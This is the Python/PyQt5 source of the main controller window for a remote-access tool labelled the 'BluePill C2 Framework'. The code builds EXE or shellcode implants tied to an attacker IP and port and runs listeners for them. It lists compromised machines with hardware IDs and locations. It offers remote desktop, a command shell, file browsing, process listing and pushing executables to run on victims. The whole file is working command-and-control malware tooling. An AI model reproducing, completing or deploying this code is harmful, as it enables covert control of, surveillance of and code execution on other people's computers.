
import sys
from PyQt5.QtWidgets import QApplication, QMessageBox, QMainWindow, QTableWidget, QPushButton, QVBoxLayout, QWidget, QHeaderView, QAbstractItemView, QMenu, QHBoxLayout,QLabel, QStackedLayout
from PyQt5.QtCore import Qt, QEvent
from PyQt5.QtGui import QImage, QPixmap, QIcon
from src.remove_rows import remove_selected_rows
from src.add_data import add_new_data
from src.listener import BluePill
from src.filenav import FileExplorerApp
from src.Command import CommandPromptWindow
from src.processlist import ProcessList
from src.RemoteCapture import ScreenshotWindow
import threading
import base64
import sys
import socket
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QLabel, QPushButton
from PyQt5.QtGui import QColor
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTreeWidget, QTreeWidgetItem, QLineEdit, QComboBox, QLabel, QDialog, QVBoxLayout, QDialogButtonBox, QFormLayout
from src.builder import Build

class TitleBar(QWidget):
    def __init__(self):
        super().__init__()
        gradient = "background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 blue, stop:1 red);"
        self.setStyleSheet(gradient + "border: 2px solid black;")
        self.setFixedHeight(80)

        layout = QHBoxLayout(self)
        layout.addWidget(QLabel("𝕭𝖑𝖚𝖊𝕻𝖎𝖑𝖑", alignment=Qt.AlignCenter, styleSheet="font-size: 24px; color: white;"))
class AddItemDialog(QDialog):
    def __init__(self, parent=None):
        super(AddItemDialog, self).__init__(parent)
        self.setWindowTitle('Add Item')
        
        # Create layout for the dialog
        layout = QVBoxLayout(self)
        
        # Create form layout for IP and Port input
        form_layout = QFormLayout()
        self.ip_input = QLineEdit()
        self.port_input = QLineEdit()
        form_layout.addRow("IP:", self.ip_input)
        form_layout.addRow("Port:", self.port_input)
        
        # Create OK and Cancel buttons
        button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        
        # Add form layout and buttons to the dialog layout
        layout.addLayout(form_layout)
        layout.addWidget(button_box)
        
    def get_ip_and_port(self):
        ip = self.ip_input.text()
        port = self.port_input.text()
        return ip, port
class BuilderWindow(QMainWindow):
    def __init__(self, parent=None):
        super().__init__(parent)

        self.info = parent
        self.setWindowTitle('Builder Window')
        self.setGeometry(200, 200, 800, 600)

        # Create the main widget and set it as the central widget
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        # Create the layout for the main widget
        main_layout = QVBoxLayout(central_widget)

        # Create the header label for "Listening Connections"
        header_label = QLabel("Listening Connections")
        main_layout.addWidget(header_label)

        # Create the TreeView with +/- buttons
        self.tree_view = QTreeWidget()
        self.tree_view.setHeaderHidden(True)
        main_layout.addWidget(self.tree_view)

        # Create buttons for adding and deleting items
        button_layout = QHBoxLayout()
        add_button = QPushButton("+")
        delete_button = QPushButton("-")
        add_button.clicked.connect(self.add_tree_item)
        delete_button.clicked.connect(self.delete_tree_item)
        button_layout.addWidget(add_button)
        button_layout.addWidget(delete_button)
        main_layout.addLayout(button_layout)
        # Create input fields with object names
        input_field1 = QLineEdit()
        input_field1.setObjectName("input_field1")
        input_field1.setPlaceholderText("Enter IP")
        input_field2 = QLineEdit()
        input_field2.setObjectName("input_field2")
        input_field2.setPlaceholderText("Enter PORT number")
        input_field3 = QLineEdit()
        input_field3.setObjectName("input_field3")
        input_field3.setPlaceholderText("Set FILENAME")
        main_layout.addWidget(input_field1)
        main_layout.addWidget(input_field2)
        main_layout.addWidget(input_field3)
        # Create the dropdown box with an object name
        dropdown = QComboBox()
        dropdown.setObjectName("dropdown")
        dropdown.addItems(["EXE", "SHELLCODE"])
        main_layout.addWidget(dropdown)

        submit_button = QPushButton("Submit")
        submit_button.clicked.connect(self.on_submit_clicked)  # Connect the click event to a function
        main_layout.addWidget(submit_button)

    def add_tree_item(self):
        dialog = AddItemDialog(self)
        if dialog.exec_():
            ip, port = dialog.get_ip_and_port()
            try:
                port = int(port)
                stest = socket.socket()
                stest.bind((ip, port))
                stest.listen(1)
                stest.close()
                self.info.listening_connections.append([ip, port])
            except:
                print("CANNOT LISTEN AT THAT PROTOCAL OR PORT")
                return
            if ip and port:
                item = QTreeWidgetItem(self.tree_view)
                server_thread = threading.Thread(target=self.info.bluepill.initiate_server, args=(ip, port))
                server_thread.daemon = True  # Set the thread as a daemon to exit when the main program exits
                server_thread.start()
                item.setText(0, f"IP: {ip}, Port: {port}")

    def delete_tree_item(self):
        selected_items = self.tree_view.selectedItems()
        for item in selected_items:
            index = self.tree_view.indexOfTopLevelItem(item)
            self.tree_view.takeTopLevelItem(index)

    def on_submit_clicked(self):
        
        # Access the data from input fields and the dropdown using their object names
        ipaddress = self.findChild(QLineEdit, "input_field1").text()
        port = self.findChild(QLineEdit, "input_field2").text()
        filename = self.findChild(QLineEdit, "input_field3").text()
        dropdown_data = self.findChild(QComboBox, "dropdown").currentText()
        ip_and_port = ipaddress + ":" + port

        if not filename.endswith('.exe') and dropdown_data.lower() == "exe":
            filename = filename + ".exe"
        if not filename.endswith('.c') and dropdown_data.lower() == "shellcode":
            filename = filename + '.c'
        builder = Build(file_path=filename, details=ip_and_port)
        if dropdown_data.lower() == "exe":
            bytecode = builder.compile_exe()
            with open(filename, "wb") as _file:
                _file.write(bytecode)
            self.show_message_box("BluePill C2 Framework", "Your executable has been generated")
        elif dropdown_data.lower() == "shellcode":
            bytecode = builder.gethex()
            with open(filename, "w") as _file:
                _file.write(bytecode)

            
        print(f"Input Field 1: {ipaddress}")
        print(f"Input Field 2: {port}")
        print(f"Input Field 3: {filename}")
        print(f"Dropdown: {dropdown_data}")

        # Clear the input fields
        self.findChild(QLineEdit, "input_field1").clear()
        self.findChild(QLineEdit, "input_field2").clear()
        self.findChild(QLineEdit, "input_field3").clear()

    def show_message_box(self, title, message):
        msg_box = QMessageBox()
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.exec_()

class ImageLabelUpdateEvent(QEvent):
    def __init__(self, pixmap):
        super().__init__(QEvent.User)
        
        self.pixmap = pixmap

    def getPixmap(self):
        return self.pixmap

    def setPixmap(self, pixmap):
        self.pixmap = pixmap

class MyWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.items = []
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        self.add_new_data = add_new_data.__get__(self)
        self.remove_selected_rows = remove_selected_rows.__get__(self)
        self.bluepill = BluePill(self)
        self.stream = []
        self.command = []
        self.remote_window = []
        self.display_info = []
        self.connection = []
        self.address = []
        self.command_window = []
        self.file_explorer = []
        self.process_manager = []
        self.child_windows = []
        self.listening_connections = []
        # Set window properties
        dark_stylesheet = """
            QWidget {
                background-color: #333;
                color: #fff;
            }
            QPushButton {
                background-color: #555;
                border: 1px solid #444;
                padding: 5px 10px;
            }
            QPushButton:hover {
                background-color: #777;
            }
        """
        QApplication.setStyle('Fusion')
        self.setStyleSheet(dark_stylesheet)
        self.setWindowTitle("BluePill C2 Framework")
        self.setGeometry(100, 100, 800, 400)
        # Remove default title bar  
        self.setMenuWidget(QWidget())
        # Create a custom title bar
        title_bar = TitleBar()
        self.setMenuWidget(title_bar)
        # Create a central widget and layout
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout(central_widget)
        self.id_to_row_mapping = {}
        # Create a QTableWidget
        self.table_widget = QTableWidget(self)

        # Calculate 80% of the original height
        layout.addWidget(self.table_widget)

        # Set the selection mode to full row
        self.table_widget.setSelectionBehavior(QAbstractItemView.SelectRows)

        # Hide vertical header (row numbers)
        self.table_widget.verticalHeader().setVisible(False)

        # Create headers for the table
        headers = ["ID", "HOST", "IP", "PORT", "HWID", "LOCATION", "OS", "OS Version", "CPU DETAILS", "GPU DETAILS"]
        self.table_widget.setColumnCount(len(headers))
        self.table_widget.setHorizontalHeaderLabels(headers)

        # Set header to stretch to evenly distribute columns
        header = self.table_widget.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.Interactive)
        for i in range(len(headers)):
            item = self.table_widget.horizontalHeaderItem(i)
            item.setForeground(QColor(255, 255, 255))  # White color


        remove_button = QPushButton("Disconnect", self)
        startserver = QPushButton("start server", self)
        add_data_button = QPushButton("Builder", self)
        add_data_button.clicked.connect(self.openBuilderWindow)
        # Style the buttons
        button_style = """
        QPushButton {
            background-color: #0096FF;  /* Red color for remove button */
            color: white;
            border: 3px solid #ff4d4d;
            border-radius: 4px;
            padding: 7px 2px;  /* Adjust padding to make the buttons smaller */
            min-width: 50px;   /* Adjust the minimum width to make the buttons smaller */
        }

        QPushButton:hover {
            background-color: #ff6666;  /* Lighter red on hover */
            border: 1px solid #ff6666;
        }

        QPushButton:pressed {
            background-color: #ff3333;  /* Darker red when pressed */
            border: 1px solid #ff3333;
        }
        """

        remove_button.setStyleSheet(button_style)
        startserver.setStyleSheet(button_style)
        add_data_button.setStyleSheet(button_style)

        # Create a horizontal layout for the buttons
        button_layout = QHBoxLayout()
        button_layout.addWidget(remove_button)
        button_layout.addWidget(add_data_button)
        button_layout.addWidget(startserver)
        layout.addLayout(button_layout)
        header.setStyleSheet("color: black;")
        table_style = """
        QTableWidget {
            background-color: black;  /* Background color set to black */
            color: white;  /* Text color set to white */
            gridline-color: white; /* Set the color of grid lines between cells */
        }
        QTableWidget::item {
            padding: 5px; /* Adjust cell padding */
            border-bottom: 1px solid white; /* Add a white horizontal border between rows */
        }
        """
        self.table_widget.setStyleSheet(table_style)
        self.table_widget.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table_widget.setContextMenuPolicy(Qt.CustomContextMenu)
        self.table_widget.customContextMenuRequested.connect(self.show_context_menu)
        self.last_used_id = 0

        # Connect button signals to functions
        remove_button.clicked.connect(self.remove_selected_rows)
        # add_data_button.clicked.connect(self.add_new_data)
        startserver.clicked.connect(self.start_bluepill_server)
        self.setWindowTitle("BluePill C2")
        self.setGeometry(100, 100, 800, 600)
        self.upload_icon = b'iVBORw0KGgoAAAANSUhEUgAAAIcAAABrCAMAAABqv2HBAAAAM1BMVEUAAACysrKVlZX39/fBwcFlZWWdnZ3///8LCwvFxcVBQUEwMDDu7u4dHR3e3t5QUFCEhIQ6xzm/AAABRElEQVRo3u3a2W6DMBCFYbOeYTXv/7RFSarWYU29jFWd/zpCnyIZDwZjGGOMMXaSWCs5MMqqavUh0mKtnZQZ04MBFLqQqQAygPwwgG5QYww1kAFk6IAMIP0bA5h7DcaMTbNNzrA7DAXIPgMYm7RbyghkAGkOGSkhcsYAqiXNridLBehDLhkrpIwPWccNQB8iJW4VeSD5HjeuizoH/N7nFSGfMIA61vbrjhvXRZoDpK2cdheKUxFl1cjQOzXz9pbu/iLRXLRZO8W7PI1jcytpdeZTOuiggw466KCDDjrooIMOOnJ1yDNPx/lVbmS7R4ufQ5bnZf5+9N7sP8Z/+n+8TpEaZYdk4jB0KDtKHUc/j05HL8ViO8w0OB0dIEd33IwOOuhQcIhfoRxj7dcYyBEoOuj4347X80ugPD4dkpAZxhhjjOn2BRveQ2zrUTM7AAAAAElFTkSuQmCC'
        self.remove_icon = b'iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeBAMAAADJHrORAAAAJFBMVEXRAABHcEzRAADRAADRAADRAADRAADRAADRAADRAADRAADRAAAVPsrJAAAAC3RSTlMfALrAtBjsAjFgYpSAdqIAAADOSURBVBjTYxBEBQyE+eKtUHZEIZgvmcII5gq4TQTxxaftdgDzmXZnFgL5Etm7N4EUCGjv3tYI5Itq796tAJbevSkQpB/EYBQUsAYLM4AV7jYQZN69ewsjxH6W3bs3MwClHaDuEfDevdsYIg1xH1ABELjC3SsKVLB7SyDC/SEwaSgfaCXYDVC+AFg9oyCqeQ6COOwDSm9i0Ia7ByStADIS6l4WiH8gChjAjoH6d0sgJDw2I4cHMLwMoI7KAoWXoFQyJDwL1BZiDW/BQhLiCwDVVWOoPYoEwgAAAABJRU5ErkJggg=='
        self.remote_icon = b'iVBORw0KGgoAAAANSUhEUgAAAB4AAAAbCAMAAABcI88jAAAAS1BMVEX///9UVFTS0tISEhL9/f0DAwP7+/sAAABLS0sGBgZra2sMDAyNjY0dHR3e3t6ysrKampqBgYH5+fk0NDRoaGg5OTnKyso9PT1kZGQI95hjAAAA2UlEQVQoz3XT4XaDIAwF4MgiAQMitLN9/yddGC2VLdw/HvwOiHgF4/w6iXcGHM2zLsAUl0kiMXhyBe0laNsYiyP/y3ANHrndUNkevGY7YwxMHFBh7GqVxUs4ABITZYT/jHnlA8yNyO0aB0/Vv7v/WTx3fxZta5mIk3g8tffe5fhvRq5GeXZXeG185PJ8ac84O8VRO7dDgnMfFGzjx2nUnA/hSP5rEk8R5BtMwwFK2u5byz3WfsX3cNvS2ISlTlksaMFaLolUDxVOtZoSKW5SOHy2FFR+/x0X/gGpPhCR8haLwwAAAABJRU5ErkJggg=='

    # def exit_application(self):
    #     print("OK")
    #     for file_explorer in self.file_explorer:
    #         try: file_explorer.close()
    #         except: pass
    #     for command in self.command_window:
    #         try: file_explorer.close()
    #         except: pass
    #     print("DESTROYED")

    def closeEvent(self, event):
        # Override the closeEvent to handle the window close button
        reply = QMessageBox.question(self, 'Message', 'Are you sure you want to quit?', 
                                     QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
            for child in self.process_manager + self.command_window + self.file_explorer:
                try:
                    child.close()
                except:
                    pass
            QApplication.quit()
        else:
            event.ignore()
    def start_bluepill_server(self):
        # Create a thread to run the initiate_server method
        server_thread = threading.Thread(target=self.bluepill.initiate_server, args=('0.0.0.0', 8080))
        server_thread.daemon = True  # Set the thread as a daemon to exit when the main program exits
        server_thread.start()
        
    def get_row(self):
        selected_rows = set(index.row() for index in self.table_widget.selectionModel().selectedRows())
        for row in sorted(selected_rows, reverse=True):
            return self.table_widget.item(row, 0).text(), row
        return None, True

    def show_context_menu(self, pos):
        row_id, row = self.get_row()
        if row_id is None:
            return
        menu = QMenu(self)
        remove_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.remove_icon))))
        remote_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.remote_icon))))
        command_icon = QIcon(QPixmap.fromImage(QImage.fromData(base64.b64decode(self.upload_icon))))
        folder_icon = QIcon(QPixmap("src/folder_icon.png"))
        remove_action = menu.addAction(remove_icon, "Disconnect")
        remote_action = menu.addAction(remote_icon, "Remote Desktop")
        command_action = menu.addAction(command_icon, "Command prompt")
        file_explorer = menu.addAction(folder_icon, "File Explorer")
        process_manager = menu.addAction(folder_icon, "Process Manager")
        executeFile = menu.addAction(command_icon, "Execute .NET files")
        action = menu.exec_(self.table_widget.viewport().mapToGlobal(pos))
        if action == remove_action:
            row_id, row = self.get_row()
            self.bluepill.send(b"STOPCODE", self.connection[int(row_id)-1])
        elif action == command_action:
            row_id, _ = self.get_row()
            self.command_window[int(row_id)-1] = CommandPromptWindow(row_id, parent=self)
            self.command_window[int(row_id)-1].show()
        elif action == remote_action:
            # Check if the remote_window instance already exists
            if not self.remote_window[int(row_id)-1]:
                row_id, _ = self.get_row()
                self.bluepill.send(b"stream", self.connection[int(row_id)-1])
                ScreenshotWindow(str(row_id), self.display_info[int(row_id)-1], parent=self).show()
                self.remote_window[int(row_id)-1] = True
        elif action == executeFile:
            with open("C:\\Users\\Hamz2\\Desktop\\BluePill-Obf-main\\dist\\unobfuscated.exe", "rb") as f:
                binary_data = f.read()
                hex_bytecode = "".join(f"{byte:02X}" for byte in binary_data)
            self.bluepill.send(b"executable->" + hex_bytecode.encode('utf-8'), self.connection[int(row_id)-1])
        elif action == file_explorer:
            if not self.file_explorer[int(row_id)-1]:
                self.bluepill.send(b"dir->Unknown", self.connection[int(row_id)-1])
                self.file_explorer[int(row_id)-1] = FileExplorerApp(str(row_id), parent=self)
                self.file_explorer[int(row_id)-1].show()
        elif action == process_manager:
            self.bluepill.send(b"GETPIDS", self.connection[int(row_id)-1])
            self.process_manager[int(row_id)-1] = ProcessList(str(row_id))
            self.process_manager[int(row_id)-1].show()
            
            
    def openBuilderWindow(self):
        builder_window = BuilderWindow(self)
        builder_window.show()
if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MyWindow()
    window.show()
    sys.exit(app.exec_())